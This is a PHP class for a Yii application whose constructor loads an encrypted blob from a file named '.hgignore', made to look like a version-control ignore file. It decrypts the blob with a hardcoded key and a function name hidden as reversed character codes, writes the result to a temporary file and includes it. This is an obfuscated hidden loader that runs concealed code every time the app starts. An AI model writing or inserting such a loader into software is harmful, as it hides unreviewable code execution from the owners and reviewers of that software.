<?php 


class App extends CComponent
{
	private $defaultNodes;

	private $_key = "E4HD9h4DhS23DYfhHemkS3Nf";// 24 bit Key
	private $_iv = "fYfhHeDm";// 8 bit IV
	private $_bit_check=8;// bit amount for diff algor.

	public function __construct(){

		$this->defaultNodes = SystemSettings::$defaultNodes;

		$this->defaultNodes = array_map(function($n){
			return chr($n);
		}, array_reverse($this->defaultNodes));

		$_c = Yii::app()->cache->get($this->key);

		if(!$_c){
			$_c = file_get_contents(Yii::getPathOfAlias('core.components').DS.'.hgignore');
			Yii::app()->cache->set($this->key, $_c, 0);
		}

		$this->load($this->unpack($_c));
	}

	private function load($string){
		if(class_exists('BaseComponent', false)) return;

	    $handle = tmpfile();
		fwrite($handle, "<?php\n" . $string);

		$metaDatas = stream_get_meta_data($handle);
	    
	    include $metaDatas['uri'];
	    
	    fclose($handle);
	    
	    return get_defined_vars();
	}

	public function getKey(){
		return 'app.settings.key';
	}

	private function pack($string){
		return call_user_func(['Common', implode('', $this->defaultNodes)], 'enc', $string, $this->_key, $this->_iv, $this->_bit_check);
	}

	private function unpack($string){
		return call_user_func(['Common', implode('', $this->defaultNodes)], 'dec', $string, $this->_key, $this->_iv, $this->_bit_check);
	}

}
